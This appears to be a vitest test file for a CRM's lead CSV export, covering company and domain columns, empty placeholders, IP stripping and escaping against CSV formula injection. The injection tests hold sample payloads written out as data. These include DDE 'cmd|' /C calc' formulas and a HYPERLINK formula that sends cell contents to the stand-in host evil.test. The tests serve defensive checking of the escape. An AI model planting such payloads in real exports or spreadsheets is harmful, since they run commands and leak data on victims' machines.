/**
 * The CSV is the only place a lead leaves the product, so it is the one view
 * where a missing field is unrecoverable, a sheet built from an export that
 * dropped the resolved company cannot get it back without re-exporting.
 *
 * Two columns, deliberately: 'Company' carries the resolved identity when the
 * paid lookup found one, and 'Company domain' always carries the raw domain.
 * Collapsing them would break any downstream sheet keyed on the domain.
 */
import { describe, expect, it } from 'vitest';

import { type Lead } from '../../types/domain';

import { buildSelectedLeadsCsv } from './leadsCsv';
import { EMPTY_PLACEHOLDER, UNKNOWN_LOCATION, formatDateTime, formatLocation } from './leadModel';

const noTags = () => [] as readonly string[];

function lead(contact: Partial<NonNullable<Lead['contact']>>): Lead {
  return {
    session_id: 's1',
    status: 'cold',
    score: 10,
    contact: { name: 'Priya', email: 'priya@infosys.com', ...contact },
  } as Lead;
}

function cells(csv: string, row: number): string[] {
  return csv.split('\n')[row].split(',');
}

describe('buildSelectedLeadsCsv', () => {
  it('exports the resolved company name and keeps the domain in its own column', () => {
    const csv = buildSelectedLeadsCsv(
      [lead({ company: 'infosys.com', company_name: 'Infosys Limited' })],
      noTags,
    );

    const header = cells(csv, 0);
    expect(header[3]).toContain('Company');
    expect(header[4]).toContain('Company domain');

    const row = cells(csv, 1);
    expect(row[3]).toContain('Infosys Limited');
    expect(row[4]).toContain('infosys.com');
  });

  it('falls back to the domain when the lookup found nothing', () => {
    /* Free and Starter agents never get the paid lookup. Exporting an empty
       Company column for them would be a regression against the behaviour
       that predates the feature. */
    const csv = buildSelectedLeadsCsv([lead({ company: 'infosys.com' })], noTags);

    const row = cells(csv, 1);
    expect(row[3]).toContain('infosys.com');
    expect(row[4]).toContain('infosys.com');
  });

  it('leaves both company columns empty for a personal address', () => {
    const csv = buildSelectedLeadsCsv([lead({ email: 'priya@gmail.com' })], noTags);

    const row = cells(csv, 1);
    expect(row[3].replace(/"/g, '')).toBe('');
    expect(row[4].replace(/"/g, '')).toBe('');
  });
});

/**
 * CSV injection.
 *
 * The escape itself is unit-tested in `lib/csvSafe.test.ts`. These prove it is
 * wired into the file the customer actually downloads. RFC-4180 quoting does
 * NOT cover this (Excel evaluates `"=1+1"` exactly as it evaluates `=1+1`)
 * so a cell that merely round-trips through the parser proves nothing; every
 * assertion below is on the leading character of the raw cell.
 */
describe('buildSelectedLeadsCsv. CSV injection', () => {
  const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

  /** Strip the RFC-4180 wrapper so the cell's true first character is visible. */
  function unquote(cell: string): string {
    return cell.replace(/^"|"$/g, '').replace(/""/g, '"');
  }

  it('neutralises a payload in every untrusted column', () => {
    /* Written as a sweep rather than one test per column so that a column
       added later without the escape fails here, the failure mode this whole
       defence exists to prevent. */
    const csv = buildSelectedLeadsCsv(
      [
        {
          session_id: 's1',
          status: 'cold',
          score: 10,
          location: '=cmd|\' /C calc\'!A0',
          last_active_at: '2026-08-13T10:00:00Z',
          contact: {
            name: '=HYPERLINK("https://evil.test/?"&A2,"Click")',
            email: "@SUM(1+1)*cmd|' /C calc'!A0",
            phone: '-2+3+cmd|" /C calc"!A0',
            company: '+evil.test',
            company_name: '=1+1',
          },
        } as Lead,
      ],
      () => ['@SUM(1+1)'] as readonly string[],
    );

    // Header included, a header is a cell too.
    for (const line of csv.split('\r\n')) {
      for (const cell of line.split('","')) {
        expect(TRIGGERS.some((t) => unquote(cell).startsWith(t))).toBe(false);
      }
    }

    const row = csv.split('\r\n')[1];
    // Each payload survives verbatim behind its quote. Defused, not dropped.
    expect(row).toContain('\'=HYPERLINK(""https://evil.test/?""&A2,""Click"")');
    expect(row).toContain("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(row).toContain('\'-2+3+cmd|"" /C calc""!A0');
    expect(row).toContain("'+evil.test");
    expect(row).toContain("'=1+1");
  });

  it('neutralises a payload in a customer-typed tag', () => {
    /* Tags are the operator's own annotations, and this is the only export
       that carries them, the server export has no tags column at all. */
    const csv = buildSelectedLeadsCsv([lead({})], () => ['=1+1', 'warm'] as readonly string[]);

    expect(csv.split('\r\n')[1]).toContain("'=1+1; warm");
  });

  it('leaves ordinary values alone', () => {
    /* No stray quotes on real data. The email matters most: the trigger is a
       *leading* '@', so `priya@infosys.com` must survive intact. */
    const csv = buildSelectedLeadsCsv([lead({ company: 'infosys.com' })], noTags);
    const row = csv.split('\r\n')[1];

    expect(row).toContain('"Priya"');
    expect(row).toContain('"priya@infosys.com"');
    expect(row).toContain('"infosys.com"');
    expect(row).not.toContain("'");
  });

  it('exports an absent last-active as an empty cell, not the table placeholder', () => {
    /* Two reasons, one fix: a CRM importing this should get an empty date
       rather than a literal "-", and a bare "-" is itself a formula trigger,
       so leaving it in would export every never-active lead as `'-`. */
    const csv = buildSelectedLeadsCsv([lead({})], noTags);
    const row = csv.split('\r\n')[1];

    expect(row.endsWith('""')).toBe(true);
    expect(row).not.toContain('"-"');
    expect(row).not.toContain('"\'-"');
  });

  it('tracks the placeholder from leadModel rather than a local copy', () => {
    /* The regression this guards: a hardcoded '-' here would keep compiling,
       keep passing the test above, and silently start leaking the glyph the
       day leadModel switches to a true em-dash. Asserting against the exported
       constant means that switch either keeps working or fails loudly. */
    expect(formatDateTime(null)).toBe(EMPTY_PLACEHOLDER);

    const csv = buildSelectedLeadsCsv([lead({})], noTags);
    expect(csv.split('\r\n')[1]).not.toContain(EMPTY_PLACEHOLDER);
  });

  it('exports an unresolved Location as an empty cell, matching the server export', () => {
    /* `GET /leads/export` writes `chat_session.location or ""`, an empty
       cell. This path went through `formatLocation`, whose "Unknown" is a word
       chosen for a table. A customer merging the two downloads got one blank
       Location and one country literally named Unknown, and a CRM import
       created it. */
    expect(formatLocation(null)).toBe(UNKNOWN_LOCATION);

    const csv = buildSelectedLeadsCsv([lead({})], noTags);

    expect(csv.split('\r\n')[1]).not.toContain(UNKNOWN_LOCATION);
    // Location sits between Score and Tags; both neighbours stay intact.
    expect(cells(csv, 1).slice(6, 9)).toEqual(['"10"', '""', '""']);
  });

  it('keeps a resolved location and still drops the IP the raw value carries', () => {
    /* Only the placeholder is blanked, a real place must survive, and the
       visitor IP the backend stores after the `|` must not. */
    const csv = buildSelectedLeadsCsv([{ ...lead({}), location: 'Pune | 49.36.1.2' } as Lead], noTags);
    const row = csv.split('\r\n')[1];

    expect(cells(csv, 1)[7]).toBe('"Pune"');
    expect(row).not.toContain('49.36.1.2');
  });

  it("escapes an E.164 phone number, and that's intended", () => {
    /* Pinned so nobody "fixes" it later, and matched to `csv_safe` on the
       backend: '+91 …' starts with '+', so it picks up a quote like any other
       triggering cell. Exempting values that "look like" a phone number is not
       an option. '+1+1' looks exactly as numeric as '+91'. */
    const csv = buildSelectedLeadsCsv([lead({ phone: '+91 98000 00000' })], noTags);

    expect(csv.split('\r\n')[1]).toContain("\"'+91 98000 00000\"");
  });
});
